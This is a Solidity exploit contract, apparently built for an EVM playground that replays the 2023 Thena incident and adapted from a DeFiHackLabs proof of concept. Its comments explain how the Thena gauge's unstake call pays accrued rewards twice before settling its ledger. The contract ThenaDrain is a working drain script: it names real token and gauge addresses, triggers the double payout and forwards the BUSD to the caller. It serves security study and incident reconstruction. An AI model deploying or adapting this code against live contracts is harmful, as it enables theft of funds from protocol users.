// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-03-Thena).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract:
// `ContractTest.testExploit()` just deploys `MockThenaRewardPool`, whose
// CONSTRUCTOR makes the single call `unstake(BUSD, 0, address(this), true)` on the
// live Thena gauge (an ERC1967 proxy that delegatecalls to the real, unmodified
// gauge logic at 0xaEDb0094…). There is no flash loan and no reentrant callback in
// this PoC — the gauge itself performs the harvest -> convert -> payout sequence
// TWICE inside that one external call (once for the THENA leg, once for the
// residual wUSDR leg) before it settles the caller's reward ledger, so the same
// recipient receives two BUSD payouts from one `unstake` call.
//
// The playground deploys the exploit contract BEFORE recording starts (deploy is
// unrecorded, see docs/EVM-playground-2.md §4), so the vulnerable call must live
// in the recorded `attackFunction`, not the constructor. This single-contract
// version therefore moves the original constructor-time call into `run()`
// (called externally, after deploy) — everything else (the exact call, `_pool`
// = this contract, forwarding the proceeds to the caller) is copied verbatim
// from MockThenaRewardPool's constructor in test/Thena_exp.sol.
//
// Root cause: Thena's gauge `unstake(token, amount, recipient, claim=true)`
// harvests THENA rewards, converts them (and any residual reward token) into the
// chosen payout token via AMM swaps, and TRANSFERS the converted amount to
// `recipient` BEFORE it zeroes/advances the caller's accrued-reward ledger. There
// is no reentrancy guard on the path. Because the reward computation re-reads a
// still-unsettled ledger, a single `unstake(..., claim=true)` call ends up paying
// the same accrued reward out twice in a row (THENA leg, then wUSDR leg) before
// finally emitting `Unstake`/`Reward` and settling the accounting.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IThenaRewardPool {
    function unstake(address, uint256, address, bool) external;
}

contract ThenaDrain {
    IERC20 constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IThenaRewardPool constant POOL = IThenaRewardPool(0x39E29f4FB13AeC505EF32Ee6Ff7cc16e2225B11F);

    // step 0: entrypoint (mirrors MockThenaRewardPool's constructor, moved into a
    // callable function so the recorder captures it). `_pool` = this contract,
    // so the gauge's payout hands execution/funds back to attacker-controlled code.
    function run() external {
        unstake(address(BUSD), 0, address(this), true);
        // step 3 (mirrors ContractTest.testExploit()'s final sweep): forward
        // everything this contract collected to the caller.
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
    }

    // step 1: the single vulnerable call — claim=true, amount=0 (no LP withdrawn,
    // the reward-conversion leg alone is enough). The gauge pays the converted
    // reward to `_pool` (this contract) TWICE before settling its ledger.
    function unstake(address _token, uint256 _amount, address _pool, bool _sign) internal {
        POOL.unstake(_token, _amount, _pool, _sign);
    }
}
